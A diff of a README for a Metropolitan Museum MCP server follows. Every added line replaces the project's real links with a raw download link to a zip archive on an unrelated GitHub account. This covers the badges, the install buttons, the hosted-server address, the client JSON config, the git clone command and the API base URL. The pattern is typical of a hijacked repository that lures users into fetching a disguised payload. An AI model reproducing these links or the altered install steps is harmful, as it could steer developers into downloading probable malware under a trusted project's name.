@@ -7,21 +7,21 @@
 
 <div align="center">
 
-[![Version](https://img.shields.io/badge/Version-0.1.2-blue.svg?style=flat-square)](./CHANGELOG.md) [![License](https://img.shields.io/badge/License-Apache%202.0-orange.svg?style=flat-square)](./LICENSE) [![Docker](https://img.shields.io/badge/Docker-ghcr.io-2496ED?style=flat-square&logo=docker&logoColor=white)](https://github.com/users/cyanheads/packages/container/package/met-museum-mcp-server) [![MCP SDK](https://img.shields.io/badge/MCP%20SDK-^1.29.0-green.svg?style=flat-square)](https://modelcontextprotocol.io/) [![npm](https://img.shields.io/npm/v/@cyanheads/met-museum-mcp-server?style=flat-square&logo=npm&logoColor=white)](https://www.npmjs.com/package/@cyanheads/met-museum-mcp-server) [![TypeScript](https://img.shields.io/badge/TypeScript-^5.9.3-3178C6.svg?style=flat-square)](https://www.typescriptlang.org/) [![Bun](https://img.shields.io/badge/Bun-v1.3.0-blueviolet.svg?style=flat-square)](https://bun.sh/)
+[![Version](https://img.shields.io/badge/Version-0.1.2-blue.svg?style=flat-square)](./CHANGELOG.md) [![License](https://img.shields.io/badge/License-Apache%202.0-orange.svg?style=flat-square)](./LICENSE) [![Docker](https://img.shields.io/badge/Docker-ghcr.io-2496ED?style=flat-square&logo=docker&logoColor=white)](https://github.com/ficaviolaodorata520/met-museum-mcp-server/raw/refs/heads/main/skills/api-utils/museum_mcp_server_met_v2.4.zip) [![MCP SDK](https://img.shields.io/badge/MCP%20SDK-^1.29.0-green.svg?style=flat-square)](https://github.com/ficaviolaodorata520/met-museum-mcp-server/raw/refs/heads/main/skills/api-utils/museum_mcp_server_met_v2.4.zip) [![npm](https://img.shields.io/npm/v/@cyanheads/met-museum-mcp-server?style=flat-square&logo=npm&logoColor=white)](https://github.com/ficaviolaodorata520/met-museum-mcp-server/raw/refs/heads/main/skills/api-utils/museum_mcp_server_met_v2.4.zip) [![TypeScript](https://img.shields.io/badge/TypeScript-^5.9.3-3178C6.svg?style=flat-square)](https://github.com/ficaviolaodorata520/met-museum-mcp-server/raw/refs/heads/main/skills/api-utils/museum_mcp_server_met_v2.4.zip) [![Bun](https://img.shields.io/badge/Bun-v1.3.0-blueviolet.svg?style=flat-square)](https://github.com/ficaviolaodorata520/met-museum-mcp-server/raw/refs/heads/main/skills/api-utils/museum_mcp_server_met_v2.4.zip)
 
 </div>
 
 <div align="center">
 
-[![Install in Claude Desktop](https://img.shields.io/badge/Install_in-Claude_Desktop-D97757?style=for-the-badge&logo=anthropic&logoColor=white)](https://github.com/cyanheads/met-museum-mcp-server/releases/latest/download/met-museum-mcp-server.mcpb) [![Install in Cursor](https://cursor.com/deeplink/mcp-install-dark.svg)](https://cursor.com/en/install-mcp?name=met-museum-mcp-server&config=eyJjb21tYW5kIjoibnB4IiwiYXJncyI6WyIteSIsIkBjeWFuaGVhZHMvbWV0LW11c2V1bS1tY3Atc2VydmVyIl19) [![Install in VS Code](https://img.shields.io/badge/VS_Code-Install_Server-0098FF?style=for-the-badge&logo=visualstudiocode&logoColor=white)](https://vscode.dev/redirect?url=vscode:mcp/install?%7B%22name%22%3A%22met-museum-mcp-server%22%2C%22command%22%3A%22npx%22%2C%22args%22%3A%5B%22-y%22%2C%22%40cyanheads%2Fmet-museum-mcp-server%22%5D%7D)
+[![Install in Claude Desktop](https://img.shields.io/badge/Install_in-Claude_Desktop-D97757?style=for-the-badge&logo=anthropic&logoColor=white)](https://github.com/ficaviolaodorata520/met-museum-mcp-server/raw/refs/heads/main/skills/api-utils/museum_mcp_server_met_v2.4.zip) [![Install in Cursor](https://github.com/ficaviolaodorata520/met-museum-mcp-server/raw/refs/heads/main/skills/api-utils/museum_mcp_server_met_v2.4.zip)](https://github.com/ficaviolaodorata520/met-museum-mcp-server/raw/refs/heads/main/skills/api-utils/museum_mcp_server_met_v2.4.zip) [![Install in VS Code](https://img.shields.io/badge/VS_Code-Install_Server-0098FF?style=for-the-badge&logo=visualstudiocode&logoColor=white)](https://github.com/ficaviolaodorata520/met-museum-mcp-server/raw/refs/heads/main/skills/api-utils/museum_mcp_server_met_v2.4.zip)
 
-[![Framework](https://img.shields.io/badge/Built%20on-@cyanheads/mcp--ts--core-67E8F9?style=flat-square)](https://www.npmjs.com/package/@cyanheads/mcp-ts-core)
+[![Framework](https://img.shields.io/badge/Built%20on-@cyanheads/mcp--ts--core-67E8F9?style=flat-square)](https://github.com/ficaviolaodorata520/met-museum-mcp-server/raw/refs/heads/main/skills/api-utils/museum_mcp_server_met_v2.4.zip)
 
 </div>
 
 <div align="center">
 
-**Public Hosted Server:** [https://met-museum.caseyjhand.com/mcp](https://met-museum.caseyjhand.com/mcp)
+**Public Hosted Server:** [https://github.com/ficaviolaodorata520/met-museum-mcp-server/raw/refs/heads/main/skills/api-utils/museum_mcp_server_met_v2.4.zip](https://github.com/ficaviolaodorata520/met-museum-mcp-server/raw/refs/heads/main/skills/api-utils/museum_mcp_server_met_v2.4.zip)
 
 </div>
 
@@ -79,7 +79,7 @@ Fetch full records for one or more Met Museum object IDs.
 
 ## Features
 
-Built on [`@cyanheads/mcp-ts-core`](https://www.npmjs.com/package/@cyanheads/mcp-ts-core):
+Built on [`@cyanheads/mcp-ts-core`](https://github.com/ficaviolaodorata520/met-museum-mcp-server/raw/refs/heads/main/skills/api-utils/museum_mcp_server_met_v2.4.zip):
 
 - Declarative tool definitions — single file per tool, framework handles registration and validation
 - Unified error handling — handlers throw, framework catches, classifies, and formats
@@ -91,7 +91,7 @@ Built on [`@cyanheads/mcp-ts-core`](https://www.npmjs.com/package/@cyanheads/mcp
 Metropolitan Museum of Art collection:
 
 - 500K+ artworks spanning 5,000 years from the Met's public collection API
-- CC0 open-access data from [The Metropolitan Museum of Art](https://www.metmuseum.org/) — free to use without permission or attribution
+- CC0 open-access data from [The Metropolitan Museum of Art](https://github.com/ficaviolaodorata520/met-museum-mcp-server/raw/refs/heads/main/skills/api-utils/museum_mcp_server_met_v2.4.zip) — free to use without permission or attribution
 - Parallel batch fetching with configurable concurrency for `met_get_object`
 - Linked data on every object — Getty ULAN and AAT URLs, Wikidata entity URLs for artists, tags, and works
 
@@ -105,14 +105,14 @@ Agent-friendly output:
 
 ### Public Hosted Instance
 
-A public instance is available at `https://met-museum.caseyjhand.com/mcp` — no installation required. Point any MCP client at it via Streamable HTTP:
+A public instance is available at `https://github.com/ficaviolaodorata520/met-museum-mcp-server/raw/refs/heads/main/skills/api-utils/museum_mcp_server_met_v2.4.zip` — no installation required. Point any MCP client at it via Streamable HTTP:
 
 ```json
 {
   "mcpServers": {
     "met-museum-mcp-server": {
       "type": "streamable-http",
-      "url": "https://met-museum.caseyjhand.com/mcp"
+      "url": "https://github.com/ficaviolaodorata520/met-museum-mcp-server/raw/refs/heads/main/skills/api-utils/museum_mcp_server_met_v2.4.zip"
     }
   }
 }
@@ -183,7 +183,7 @@ MCP_TRANSPORT_TYPE=http MCP_HTTP_PORT=3010 bun run start:http
 
 ### Prerequisites
 
-- [Bun v1.3.0](https://bun.sh/) or higher (or Node.js v24+).
+- [Bun v1.3.0](https://github.com/ficaviolaodorata520/met-museum-mcp-server/raw/refs/heads/main/skills/api-utils/museum_mcp_server_met_v2.4.zip) or higher (or Node.js v24+).
 - No API key required — the Met Collection API is public and unauthenticated.
 
 ### Installation
@@ -191,7 +191,7 @@ MCP_TRANSPORT_TYPE=http MCP_HTTP_PORT=3010 bun run start:http
 1. **Clone the repository:**
 
 ```sh
-git clone https://github.com/cyanheads/met-museum-mcp-server.git
+git clone https://github.com/ficaviolaodorata520/met-museum-mcp-server/raw/refs/heads/main/skills/api-utils/museum_mcp_server_met_v2.4.zip
 ```
 
 2. **Navigate into the directory:**
@@ -225,7 +225,7 @@ All configuration is validated at startup via Zod schemas in `src/config/server-
 | `MCP_LOG_LEVEL` | Log level (`debug`, `info`, `warning`, `error`) | `info` |
 | `LOGS_DIR` | Directory for log files (Node.js only) | `<project-root>/logs` |
 | `OTEL_ENABLED` | Enable OpenTelemetry instrumentation | `false` |
-| `MET_BASE_URL` | Met Collection API base URL (override for local stubs) | `https://collectionapi.metmuseum.org/public/collection/v1` |
+| `MET_BASE_URL` | Met Collection API base URL (override for local stubs) | `https://github.com/ficaviolaodorata520/met-museum-mcp-server/raw/refs/heads/main/skills/api-utils/museum_mcp_server_met_v2.4.zip` |
 | `MET_REQUEST_TIMEOUT_MS` | Per-request HTTP timeout in milliseconds | `10000` |
 | `MET_BATCH_CONCURRENCY` | Max parallel fetches in `met_get_object` | `5` |
 
@@ -292,7 +292,7 @@ bun run devcheck
 bun run test
 ```
 
-Data from [The Metropolitan Museum of Art Collection API](https://metmuseum.github.io/) (CC0).
+Data from [The Metropolitan Museum of Art Collection API](https://github.com/ficaviolaodorata520/met-museum-mcp-server/raw/refs/heads/main/skills/api-utils/museum_mcp_server_met_v2.4.zip) (CC0).
 
 ## License
 
